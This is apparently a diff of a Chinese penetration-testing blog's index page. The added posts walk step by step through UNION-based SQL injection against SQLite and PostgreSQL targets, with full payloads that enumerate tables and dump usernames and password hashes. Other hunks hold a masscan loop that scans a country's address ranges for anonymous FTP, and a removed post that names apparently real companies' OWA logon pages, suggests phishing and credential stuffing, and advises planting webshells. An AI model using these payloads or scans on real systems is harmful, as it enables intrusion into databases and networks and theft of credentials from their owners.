@@ -139,6 +139,129 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/05/18/sqlite3-common-injection/">
+                sql注入入门 之 sqlite3常规注入 [ union方式 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-05-18</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/all-sql-injection/">all sql injection</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>1,本次 sqlite3 实例注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span>&amp;ca=<span class="number">7</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqlite3_common_injection.png" alt="&#39;&#39;"><br></p>
+<p>2,依旧是迷人的单引号,尝试干扰id参数,返回sqlite数据库报错,具体报错信息如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span><span class="string">'&amp;ca=7</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqlite3_common_injection1.png" alt="&#39;&#39;"><br></p>
+<p>3,尝试闭合<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> &amp;ca=<span class="number">7</span>    条件为真时,页面返回正常,数字型注入</div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqlite3_common_injection2.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span> &amp;ca=<span class="number">7</span>  条件为假时,页面</div></pre></td></tr></table></figure>
+<p><img src="/img/sqlite3_common_injection3.png" alt="&#39;&#39;"><br></p>
+<p>4,查询当前表中的字段个数<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> order by <span class="number">38</span> &amp;ca=<span class="number">7</span> 个数为<span class="number">38</span>时返回正常</div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqlite3_common_injection4.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> order by <span class="number">39</span> &amp;ca=<span class="number">7</span>  个数为<span class="number">39</span>时返回错误,说明当前表存在<span class="number">38</span>个字段</div></pre></td></tr></table></figure>
+<p><img src="/img/sqlite3_common_injection5.png" alt="&#39;&#39;"><br></p>
+<p>8,执行union爆出对应的数据显示位,这个的显示位稍微有点儿跑偏,数据显示位在title标记里,你可以右键源代码进行查看<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">123</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>--&amp;ca=<span class="number">7</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqlite3_common_injection6.png" alt="&#39;&#39;"><br></p>
+<p>9,有了数据位,接下来正常的查数据就可以了,还是先搜集下数据库信息,获取当前sqlite版本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">123</span> UNION SELECT <span class="number">1</span>,sqlite_version(),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>--&amp;ca=<span class="number">7</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqlite3_common_injection7.png" alt="&#39;&#39;"><br></p>
+<p>10,查出所有表名,这里可以用burpsuite来跑比较方便<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">123</span> UNION SELECT <span class="number">1</span>,name,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span> FROM sqlite_master WHERE type=<span class="string">'table'</span> limit <span class="number">0</span>,<span class="number">1</span> --&amp;ca=<span class="number">7</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqlite3_common_injection8.png" alt="&#39;&#39;"><br><br><img src="/img/sqlite3_common_injection9.png" alt="&#39;&#39;"><br><br><img src="/img/sqlite3_common_injection10.png" alt="&#39;&#39;"><br><br><img src="/img/sqlite3_common_injection11.png" alt="&#39;&#39;"><br></p>
+<p>11,直接一次性查出所有表名及每张表所对应的表结构<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">123</span> UNION SELECT <span class="number">1</span>,sql,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span> FROM sqlite_master WHERE type=<span class="string">'table'</span> limit <span class="number">0</span>,<span class="number">1</span>  --&amp;ca=<span class="number">7</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqlite3_common_injection12.png" alt="&#39;&#39;"><br><br><img src="/img/sqlite3_common_injection13.png" alt="&#39;&#39;"><br><br><img src="/img/sqlite3_common_injection14.png" alt="&#39;&#39;"><br></p>
+<p>12,查出对应字段下的账号密码数据<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">123</span> UNION SELECT <span class="number">1</span>,login<span class="params">||</span><span class="string">'::'</span><span class="params">||</span>pass,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span> FROM utilisateurs limit <span class="number">0</span>,<span class="number">1</span>  --&amp;ca=<span class="number">7</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqlite3_common_injection15.png" alt="&#39;&#39;"><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于sqlite注入实在没什么好说的,非常简单,作为access的替代品,在注入方式上几乎没什么不同,多找实例练习即可……</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/05/17/postgresql-common-injection/">
+                sql注入入门 之 postgresql常规注入 [ union方式 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-05-17</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/all-sql-injection/">all sql injection</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>1,用于演示的 postgresql 常规注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection.png" alt="&#39;&#39;"><br></p>
+<p>2,依然是一个神奇的单引号,pgsql返回报错,这里可能需要您稍微注意下pgsql的报错信息,pg_前缀一般指的都是postgresql数据库,而像ora前缀一般指的都是oracle数据库,mysql一般都是mysql的前缀,稍微注意下就行<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span><span class="string">'</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection1.png" alt="&#39;&#39;"><br></p>
+<p>3,典型的常规数字型注入<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> 	条件为真时,页面返回正常</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection2.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span>  条件为假时,页面返回异常</div></pre></td></tr></table></figure>
+<p><img src="/img/pg_union_injection3.png" alt="&#39;&#39;"><br></p>
+<p>4,查询当前表的字段个数<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> order by <span class="number">4</span>  字段个数为<span class="number">4</span>时返回正常</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection4.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> order by <span class="number">5</span>  字段个数为<span class="number">5</span>时返回错误,可知当前表的字段个数为<span class="number">4</span>个</div></pre></td></tr></table></figure>
+<p><img src="/img/pg_union_injection5.png" alt="&#39;&#39;"><br></p>
+<p>5,因为postgresql不支持像mysql或者access那样直接用数字来表示,所以这里只能用null来表示,null可以兼容任意数据类型嘛,sqlmap默认都是用null进行探测<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,null,null,null --</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection6.png" alt="&#39;&#39;"><br></p>
+<p>6,在得知确切的字段个数后,紧接着就该爆出数据显示位了,这里依然不像数字那么直接,我们需要逐个字段尝试可以正常显示数据的字段位,因为union要求前后的数据字段类型和个数都要完全一致才可以,利用这一特性,我们可以知道某个字段是什么数据类型,可以看到第二个字段是字符型的,也就是说我们等会儿可以把查出来的数据都显示在这个字段上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,<span class="string">'s'</span>,null,null --</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection7.png" alt="&#39;&#39;"><br></p>
+<p>7,搜集数据库的各种信息<br>获取当前数据库版本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,version(),null,null --</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection8.png" alt="&#39;&#39;"><br></p>
+<p>获取当前数据库用户名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,current_user,null,null --</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection9.png" alt="&#39;&#39;"><br></p>
+<p>获取当前当前数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,current_database(),null,null--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection11.png" alt="&#39;&#39;"><br></p>
+<p>8,获取当前数据库中所有具有dba(数据库管理员)权限的用户,同样是利用limit即可依次遍历出所有具有dba权限的用户名,只不过这里的limit和mysql中的limit有点儿不大一样,中间并不是用逗号而是直接用了个offset关键字,来设置偏移量<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,usename,null,null FROM pg_user WHERE usesuper IS TRUE limit <span class="number">1</span> offset <span class="number">0</span>--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection10.png" alt="&#39;&#39;"><br></p>
+<p>9,获取所有的数据库名(有权限看到的所有数据库名),同样是利用limit即可依次遍历出所有数据库名,实际注入中,用burupsuite跑下即可<br>如下,获取第一个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,datname,null,null from pg_database limit <span class="number">1</span> offset <span class="number">0</span> --</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection12.png" alt="&#39;&#39;"><br></p>
+<p>如下,获取第二个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,datname,null,null from pg_database limit <span class="number">1</span> offset <span class="number">1</span> --</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection13.png" alt="&#39;&#39;"><br></p>
+<p>10,获取当前库中所有的表名<br>获取第一张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,tablename,null,null from pg_tables where schemaname=<span class="string">'public'</span>  limit <span class="number">1</span> offset <span class="number">0</span> --</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection14.png" alt="&#39;&#39;"><br></p>
+<p>获取第二张表名,看到’users’ 正是我们想要的管理表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,tablename,null,null from pg_tables where schemaname=<span class="string">'public'</span>  limit <span class="number">1</span> offset <span class="number">1</span> --</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection15.png" alt="&#39;&#39;"><br></p>
+<p>11,获取users表中的所有字段名<br>获取users表中的第二个字段名,其结果为’password’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,column_name,null,null from information_schema.columns where table_name=<span class="string">'users'</span> limit <span class="number">1</span> offset <span class="number">1</span> --</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection16.png" alt="&#39;&#39;"><br></p>
+<p>获取user表中的第三个字段名,其结果为’login’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,column_name,null,null from information_schema.columns where table_name=<span class="string">'users'</span> limit <span class="number">1</span> offset <span class="number">2</span> --</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection17.png" alt="&#39;&#39;"><br></p>
+<p>12,获取对应账号密码字段的数据即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,login<span class="params">||</span><span class="string">'::'</span><span class="params">||</span>password,null,null from public.users--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/pg_union_injection18.png" alt="&#39;&#39;"><br></p>
+<p>最终,获取到的数据如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">admin::<span class="number">8</span>efe310f9ab3efeae8d410a8e0166eb2</div></pre></td></tr></table></figure></p>
+<p><br><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于pgsql的常规手注大概就这些了,跟mysql还有mssql的注入都非常接近,比较简单,就不多说了,大家多练习,多实战,然后不断解决实际中遇到的各种各样的问题,长此以往快就能慢慢积累自己的实战经验了,进步自然就稳健多了……</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/05/16/mssql-error-injection/">
                 sql注入入门 之 mssql常规显错注入
             </a>
@@ -1278,89 +1401,6 @@
 <p>0x11 如果你有兴趣,想针对某个国家网段进行大规模扫描也可以把它写成这样,当然,我这里是随便写的,你要想实际用肯定是远远不够的,单单只是提供个小demo,能自动化的事情还有很多,写个shell还是比较简单的,还是留给大家根据自己的实际需求自行发挥吧,反正工具就在那里,相互配合才能出效果,各自为战是很难有所作为的<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></div><div class="line">while read LINE</div><div class="line">do</div><div class="line">   masscan -p 21 --rate=100 $LINE | tee -a 21.txt</div><div class="line">done &lt; hk_ip.txt</div><div class="line"><span class="meta"></span></div><div class="line"></div><div class="line">#<span class="bash"> tail -f 21.txt</span></div><div class="line"><span class="meta">#</span><span class="bash"> awk &#123;<span class="string">'print $6'</span>&#125; 21.txt &gt;&gt; result.txt</span></div><div class="line"><span class="meta">#</span><span class="bash"> nmap -p 21 -iL result.txt  -oN ftp_anonymous.txt  -v --script ftp-anon.nse</span></div></pre></td></tr></table></figure></p>
 <p><br></p>
 <p>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于端口渗透,如果不是你自己写工具的情况下,其实本身使用上并没多少技术含量,至于无状态扫描的具体内部实现还是比较复杂的,至今为止,很多东西我自己也扔在学习中,如果大家真想深入去理解,非常建议自己直接拿着wireshark一边跑一边认真观察分析,没有什么比数据包更能说明问题,篇幅限制,这里我就不一一把每种扫描方式都带着大家跑一遍了,有些东西还是需要自己亲自尝试,不然,别人的东西永远都只是别的,端口这个东西,怎么说呢,有很多运气和经验敏感度的成分在里面,可能还要外加一个高质量的字典,另外,再多说一句,在没有十足的把握的情况下,直接在公网跑字典基本是不太靠谱的,实际测试中,对一些稍有防护的目标,爆破的成率还是蛮低的[虽然低,但往往非常有效,走投无路时不妨尝试],当然啦,对于端口,爆破只是很小的一个方面,比如,当我们发现某个工具或者系统服务存在远程溢出或者代码执行[不仅限于此类的可远程利用的漏洞,任何可以直接远程主动getshell的都可以],还是那句话,如果你手里有某个主流服务的通杀远程0day,不管是你自己挖的还是买的,也许只有这时才能体现端口扫描的真正价值,另外,还有多如牛毛的小工具,这里都没提到,后续涉及到内网时我们再仔细说明,对于公网扫描,有这些,暂时足矣,祝大家好运,切记不要干坏事就好!<br><br></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2014/12/18/inside-method/">
-                web渗透第一步之信息搜集  [ 找目标内网入口 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2014-12-18</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/dirscan-tools/">dirscan tools</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 为什么要找内网入口:<br>&nbsp;&nbsp;&nbsp;&nbsp;我们渗透的最终目的大多数都是目标内网,有些核心敏感数据(比如,个人机上的一些数据),我们从边界机器是拿不到的,所以,只能深入内部,当然,这里所指的内部文件数据,并不仅限于数据库,邮件这类数据,可能由于各种各样的需求,我们还需要某些个人的数据或者组织的各种业务数据,技术的各种数据等等,一般情况下,渗透web的目的,很大程度上也是希望能从web边界直接进入到目标内部(内网),对于apt来讲,价值比较高的东西基本也全部在内部,不得不承认的是,有时候公开信息调研确实也能找到部分敏感信息,但那个含金量和时效性就远远不如内网中的了,至于如何深入到目标内部,很大程度上也取决于,我们能不能尽可能多的找到目标可能的内网入口</p>
-<p>0x02 第一种,通过vpn进入目标内网[一般都会提供一个web端的443端口表单验证]:<br>&nbsp;&nbsp;&nbsp;&nbsp;vpn,想必大家都已经非常熟悉了,在前面也已经详细说明过它的用途,除了能帮我们翻墙当跳板之外,对于一些大型目标组织或是跨国公司,他们大部分都会选择利用vpn的方式来协作办公,通过vpn在公网上开辟一条专有通道,以方便公司内部的各种业务处理,但有个前提,你要想进入这条通道,必须有正确的vpn账号密码和vpn服务器地址,登陆成功后,才能处在目标的内网中,重点也就在这里,怎么搞到目标的vpn账号密码呢,嘿嘿……方法比较多,例如,发信钓鱼,搜集目标泄露过的各种配置文件,社工撞库……</p>
-<p>0x03 利用各类邮件程序自身的漏洞尝试从web边界进入目标内网<br>&nbsp;&nbsp;&nbsp;&nbsp;下面就简单介绍一种常见的web邮件程序,[这里为什么一定要是邮件程序呢,不同于普通的web网站,普通的web服务器有时候即使拿到shell,但有可能机器并不在内网或者该机器上根本没有内网网卡,但邮件服务器一般都被会用来处理内部实际业务,从个人经验来看,web邮件程序的机器,绝大部分都在内网]:</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;owa 微软自家的exchange服务,企业为了便于统一协作管理,一般都会直接把exchange服务部署在域内,邮箱名称和邮箱密码大部分也直接是域内的系统账号密码,可以直接拿来登陆域内系统,当然,vpn也是可以尝试的,关键还是看目标具体是怎么部署的了,至于,如何搞到目标的owa的账号密码,嘿嘿……后面再总结吧,包括命令行邮件导出成pst文件,如果目标部署的有exchange server 一般直接访问下/owa/auth即可看到,服务被部署好以后管理员没有特殊情况基本就不怎么会关注/owa/auth目录下的文件了,所以当你拿到权限后,在这儿放个webshell,还是很靠谱的,一般都是web的443端口,另外,对于owa本身几乎是没什么漏洞的</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">owa的一般入口如下:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/remote.bmtjfa.com.au/owa</span><span class="regexp">/auth/logon</span>.aspx机器在域内的情况</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/mail.advancedptsm.com/owa</span><span class="regexp">/auth/logon</span>.aspx机器不在域内的情况</div><div class="line"></div><div class="line">如果没有删的话,可以访问下面的路径爆出服务器信息:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/mail.xxx.com/owa</span><span class="regexp">/auth/test</span>.aspx</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Mirapoint邮件系统:</div><div class="line">ShellShock漏洞,漏洞地址如下:</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/xxxx.com/cgi</span>-bin/search.cgi</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/xxxx.com/cgi</span>-bin/madmin.cgi</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">KerioConnect 邮件系统:</div><div class="line">一般后台只能内网访问,入口如下:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/mail.xxx.com:4040/admin</span><span class="regexp">/login/</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Zimbra 邮件系统: </div><div class="line">本地包含,入口:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/webmail.xxx.com:7071/zimbra</span>Admin/</div></pre></td></tr></table></figure>
